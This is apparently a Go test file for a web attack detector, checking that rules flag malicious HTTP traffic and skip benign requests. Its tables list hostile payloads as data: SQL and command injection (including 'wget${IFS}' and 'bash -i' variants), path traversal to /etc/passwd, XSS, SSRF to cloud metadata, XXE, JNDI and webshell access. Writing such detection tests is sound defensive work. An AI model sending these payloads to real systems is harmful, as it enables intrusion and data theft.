package main

import (
	"bytes"
	"compress/gzip"
	"fmt"
	"strings"
	"testing"
	"time"
)

func TestRules(t *testing.T) {
	if e := loadRules(""); e != nil {
		t.Fatal(e)
	}
	for _, x := range []struct {
		s    string
		want bool
	}{{"/search?q=union%20select%201", true}, {"/?q=hello", false}, {"/?q=%252e%252e%252f%252e%252e%252fetc/passwd", true}, {"/?q=hello;whoami", true}, {"/.env", true}, {"/?q=O'Reilly", false}} {
		if got := len(detect(Transaction{URL: x.s, Request: []byte(x.s)})) > 0; got != x.want {
			t.Errorf("%s got %v", x.s, got)
		}
	}
}
func TestScan(t *testing.T) {
	scans.Lock()
	scans.clients = map[string]*scanState{}
	scans.Unlock()
	now := time.Now()
	for i := 0; i < 20; i++ {
		a := scan(Transaction{Time: now, Client: "192.0.2.1:1234", URL: fmt.Sprintf("/path-%d", i), Status: 404})
		if (a != nil) != (i == 19) {
			t.Fatalf("threshold at %d: %+v", i, a)
		}
	}
}
func TestDecodeProvenance(t *testing.T) {
	loadRules("")
	var compressed bytes.Buffer
	writer := gzip.NewWriter(&compressed)
	writer.Write([]byte("union select 1"))
	writer.Close()
	payload := append([]byte(fmt.Sprintf("POST / HTTP/1.1\r\nHost: test\r\nContent-Encoding: gzip\r\nContent-Length: %d\r\n\r\n", compressed.Len())), compressed.Bytes()...)
	alerts := detect(Transaction{Request: payload})
	if len(alerts) == 0 || alerts[0].View != "gzip-body" {
		t.Fatalf("missing gzip provenance %+v", alerts)
	}
	alerts = detect(Transaction{Request: []byte("GET /?q=%75nion%20select%201 HTTP/1.1\r\nHost: test\r\nX-Literal-Percent: %\r\n\r\n")})
	if len(alerts) == 0 || alerts[0].Decoding != 1 {
		t.Fatalf("valid escapes hidden by invalid escape %+v", alerts)
	}
}

func TestExpandedDetection(t *testing.T) {
	if err := loadRules(""); err != nil {
		t.Fatal(err)
	}
	for _, test := range []struct{ rule, field, payload string }{
		{"XSS-001", "request", "<img src=x onerror=alert(1)>"},
		{"SSRF-001", "request", "url=http://169.254.169.254/latest/meta-data/"},
		{"XXE-001", "request", `<!DOCTYPE a [<!ENTITY x SYSTEM "file:///etc/passwd">]>`},
		{"SSTI-001", "request", "{{7*7}}"},
		{"JNDI-001", "request", "${jndi:ldap://example.test/a}"},
		{"DESERIAL-001", "request", "rO0ABXNy"},
		{"WEBSHELL-UPLOAD-001", "request", "Content-Disposition: form-data; name=upload; filename=\"shell.php\""},
		{"WEBSHELL-ACCESS-001", "url", "/shell.php?cmd=id"},
		{"RESPONSE-PASSWD-001", "response", "root:x:0:0:root:/root:/bin/bash\n"},
		{"RESPONSE-CMD-001", "response", "uid=0(root) gid=0(root) groups=0(root)"},
	} {
		t.Run(test.rule, func(t *testing.T) {
			record := Transaction{}
			raw := []byte(fmt.Sprintf("POST / HTTP/1.1\r\nHost: test\r\nContent-Length: %d\r\n\r\n%s", len(test.payload), test.payload))
			switch test.field {
			case "url":
				record.URL = test.payload
			case "response":
				record.Response = []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s", len(test.payload), test.payload))
			default:
				record.Request = raw
			}
			for _, alert := range detect(record) {
				if alert.Rule == test.rule {
					return
				}
			}
			t.Fatalf("missing %s", test.rule)
		})
	}
}

func TestDetectionFieldIsolation(t *testing.T) {
	original := rules
	defer func() { rules = original }()
	for _, field := range []string{"request.headers", "request.header.X-Probe", "request.body", "response.headers", "response.header.X-Probe", "response.body"} {
		t.Run(field, func(t *testing.T) {
			rules = []Rule{{ID: "CUSTOM", Version: 1, Severity: "high", Field: field, Pattern: "needle"}}
			if err := compileRules(rules); err != nil {
				t.Fatal(err)
			}
			for _, location := range []string{"request.headers", "request.body", "response.headers", "response.body"} {
				requestHead, requestBody, responseHead, responseBody := "", "", "", ""
				switch location {
				case "request.headers":
					requestHead = "X-Probe: needle\r\n"
				case "request.body":
					requestBody = "needle"
				case "response.headers":
					responseHead = "X-Probe: needle\r\n"
				case "response.body":
					responseBody = "needle"
				}
				record := Transaction{
					Request:  []byte(fmt.Sprintf("POST / HTTP/1.1\r\nHost: test\r\n%sContent-Length: %d\r\n\r\n%s", requestHead, len(requestBody), requestBody)),
					Response: []byte(fmt.Sprintf("HTTP/1.1 200 OK\r\n%sContent-Length: %d\r\n\r\n%s", responseHead, len(responseBody), responseBody)),
				}
				want := field == location || strings.Replace(field, ".header.X-Probe", ".headers", 1) == location
				if got := len(detect(record)) > 0; got != want {
					t.Errorf("%s in %s = %v, want %v", field, location, got, want)
				}
			}
		})
	}
	for _, field := range []string{"response.header.", "request.header.bad name", "response.bad"} {
		if validRuleField(field) {
			t.Errorf("accepted invalid field %s", field)
		}
	}
}

func TestNamedHeadersDoNotReadBody(t *testing.T) {
	original := rules
	defer func() { rules = original }()
	for _, field := range []string{"request.header.body", "response.header.body", "request.header.headers", "response.header.headers"} {
		rules = []Rule{{ID: "CUSTOM", Version: 1, Severity: "high", Field: field, Pattern: "needle"}}
		if err := compileRules(rules); err != nil {
			t.Fatal(err)
		}
		record := Transaction{Request: []byte("POST / HTTP/1.1\r\nHost: needle\r\nContent-Length: 6\r\n\r\nneedle"), Response: []byte("HTTP/1.1 200 OK\r\nX-Probe: needle\r\nContent-Length: 6\r\n\r\nneedle")}
		if len(detect(record)) != 0 {
			t.Fatalf("field %s leaked into body or other headers", field)
		}
	}
	rules = []Rule{{ID: "HOST", Version: 1, Severity: "high", Field: "request.header.Host", Pattern: "needle"}}
	if err := compileRules(rules); err != nil {
		t.Fatal(err)
	}
	if len(detect(Transaction{Request: []byte("GET / HTTP/1.1\r\nHost: needle\r\n\r\n")})) != 1 {
		t.Fatal("Host header was lost")
	}
}

func TestRepeatedHeaderAndLFDetection(t *testing.T) {
	original := rules
	defer func() { rules = original }()
	rules = []Rule{{ID: "CUSTOM", Version: 1, Severity: "high", Field: "request.header.X-Probe", Pattern: "needle"}}
	if err := compileRules(rules); err != nil {
		t.Fatal(err)
	}
	record := Transaction{Request: []byte("GET / HTTP/1.1\nHost: test\nX-Probe: safe\nX-Probe: needle\n\n")}
	if len(detect(record)) != 1 {
		t.Fatal("repeated header values missing")
	}
	rules[0].Field = "request.headers"
	if err := compileRules(rules); err != nil {
		t.Fatal(err)
	}
	if len(detect(record)) != 1 {
		t.Fatal("LF headers missing")
	}
}
func TestCompressedResponseDetection(t *testing.T) {
	if err := loadRules(""); err != nil {
		t.Fatal(err)
	}
	var body bytes.Buffer
	writer := gzip.NewWriter(&body)
	writer.Write([]byte("root:x:0:0:root:/root:/bin/bash\n"))
	writer.Close()
	raw := append([]byte(fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\nContent-Length: %d\r\n\r\n", body.Len())), body.Bytes()...)
	for _, alert := range detect(Transaction{Response: raw}) {
		if alert.Rule == "RESPONSE-PASSWD-001" && alert.View == "gzip-body" {
			return
		}
	}
	t.Fatal("missing compressed response alert")
}

// Header-field rules must still see a request that net/http rejects; such
// requests are kept leniently by local replay.
func TestHeaderFieldsOfMalformedRequest(t *testing.T) {
	message := detectionMessage([]byte("GET /%zz HTTP/1.1\r\nHost: test\r\nUser-Agent: sqlmap/1.7\r\nContent-Length: 2\r\nContent-Length: 3\r\n\r\nab"), false, 1024)
	if got, _ := message.content("request.header.User-Agent"); got != "sqlmap/1.7" {
		t.Fatalf("User-Agent field %q", got)
	}
	if got, _ := message.content("request.header.Host"); got != "test" {
		t.Fatalf("Host field %q", got)
	}
	if got, _ := message.content("request.body"); got != "ab" {
		t.Fatalf("body field %q", got)
	}
}

// CMD-001 must not fire on parameters that share a name with a command.
func TestCommandInjectionParameters(t *testing.T) {
	if err := loadRules(""); err != nil {
		t.Fatal(err)
	}
	fires := func(request string) bool {
		for _, alert := range detect(Transaction{Request: []byte(request)}) {
			if alert.Rule == "CMD-001" {
				return true
			}
		}
		return false
	}
	get := func(target string) string { return "GET " + target + " HTTP/1.1\r\nHost: test\r\n\r\n" }
	post := func(body string) string {
		return fmt.Sprintf("POST /f HTTP/1.1\r\nHost: test\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n%s", len(body), body)
	}
	for _, benign := range []string{
		get("/search?q=%E6%89%8B%E6%9C%BA&cat=3"), get("/orders?page=2&id=42"), get("/a?x=1&sh=0&curl=no"),
		get("/a?cat"), post("user=a&id=7&cat=books"), get("/a?q=shipping&shell=1"),
	} {
		if fires(benign) {
			t.Errorf("false positive on %q", benign)
		}
	}
	for _, attack := range []string{
		get("/cgi-bin/;cat%20/etc/passwd"), get("/ping?host=127.0.0.1|id"), get("/ping?host=1;id"),
		get("/a?x=1%26%26whoami"), get("/a?x=1;wget${IFS}http://e.test"), get("/a?x=$(id)"), get("/a?x=`id`"),
		post("cmd=whoami%3Bid&token=YWRtaW4="), post("host=1|bash -i"),
	} {
		if !fires(attack) {
			t.Errorf("missed %q", attack)
		}
	}
}
